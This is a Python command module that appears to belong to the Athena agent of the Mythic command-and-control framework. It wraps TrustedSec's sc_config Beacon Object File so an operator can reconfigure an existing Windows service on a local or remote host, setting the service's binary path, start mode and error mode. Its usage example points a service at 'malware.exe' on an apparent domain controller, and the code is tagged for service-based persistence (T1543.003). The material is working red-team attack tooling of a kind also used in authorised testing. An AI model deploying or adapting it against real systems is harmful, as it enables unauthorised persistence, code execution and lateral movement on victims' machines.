from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from ..athena_utils.mythicrpc_utilities import *
from ..athena_utils.bof_utilities import *
import json


class ScConfigArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="servicename",
                type=ParameterType.String,
                description="Required. The name of the service to configure.",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=0,
                        required=True,
                        )
                    ],
            ),
            CommandParameter(
                name="binpath",
                type=ParameterType.String,
                description="Required. The binary path of the service to execute.",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=1,
                        required=True,
                        )
                    ],
            ),
            CommandParameter(
                name="errormode",
                type=ParameterType.Number,
                description="Required. The error mode of the service. (0 = ignore errors, 1 = normal errors, 2 = severe errors, 3 = critical errors)",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=2,
                        required=True,
                        )
                    ],
            ),
            CommandParameter(
                name="startmode",
                type=ParameterType.Number,
                description="Required. The start mode for the service. (2 = auto start, 3 = demand start, 4 = disabled)",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=3,
                        required=True,
                        )
                    ],
            ),
            CommandParameter(
                name="hostname",
                type=ParameterType.String,
                description="Optional. The target system (local system if not specified)",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=4,
                        required=False,
                        )
                    ],
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
        else:
            raise ValueError("Missing arguments")
    
    async def parse_dictionary(self, dictionary):
        self.load_args_from_dictionary(dictionary)  

class ScConfigCommand(CoffCommandBase):
    cmd = "sc-config"
    needs_admin = False
    help_cmd = """Usage:   sc-config -servicename myService -binpath C:\\Users\\checkymander\\Desktop\\malware.exe -errormode 0 -startmode 2 -hostname GAIA-DC
servicename      Required. The name of the service to config.
binpath      Required. The binary path of the service to execute.
errormode    Required. The error mode of the service. The valid 
            options are:
            0 - ignore errors
            1 - nomral logging
            2 - log severe errors
            3 - log critical errors
startmode    Required. The start mode for the service. The valid
            options are:
            2 - auto start
            3 - on demand start
            4 - disabled
hostname     Optional. The host to connect to and run the commnad on. The
            local system is targeted if a HOSTNAME is not specified.

Credit: The TrustedSec team for the original BOF. - https://github.com/trustedsec/CS-Remote-OPs-BOF
"""
    description = """This module will modify an already existing service on a local or remote system."""
    version = 1
    script_only = True
    supported_ui_features = ["T1543.003"]
    author = "@TrustedSec"
    argument_class = ScConfigArguments
    attackmapping = []
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        builtin=False,
        load_only=True
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        arch = taskData.Callback.Architecture

        if(arch=="x86"):
            raise Exception("BOF's are currently only supported on x64 architectures")

        encoded_args = ""
        OfArgs = []
    

        hostname = taskData.args.get_arg("hostname")
        if hostname:
            OfArgs.append(generateString(hostname))
        else:
            OfArgs.append(generateString(""))
        
        servicename = taskData.args.get_arg("servicename")
        OfArgs.append(generateString(servicename))

        binpath = taskData.args.get_arg("binpath")
        OfArgs.append(generateString(binpath))

        errormode = taskData.args.get_arg("errormode")
        OfArgs.append(generate16bitInt(errormode))

        startmode = taskData.args.get_arg("startmode")
        OfArgs.append(generate16bitInt(startmode))

        encoded_args = base64.b64encode(SerializeArgs(OfArgs)).decode()
        file_id = await compile_and_upload_bof_to_mythic(taskData.Task.ID,"trusted_sec_remote_bofs/sc_config",f"sc_config.{arch}.o")
        subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
            taskData.Task.ID, 
            CommandName="coff",
            SubtaskCallbackFunction="coff_completion_callback",
            Params=json.dumps({
                "coffFile": file_id,
                "functionName": "go",
                "arguments": encoded_args,
                "timeout": "60",
            }),
            Token=taskData.Task.TokenID,
        ))

        # We did it!
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        pass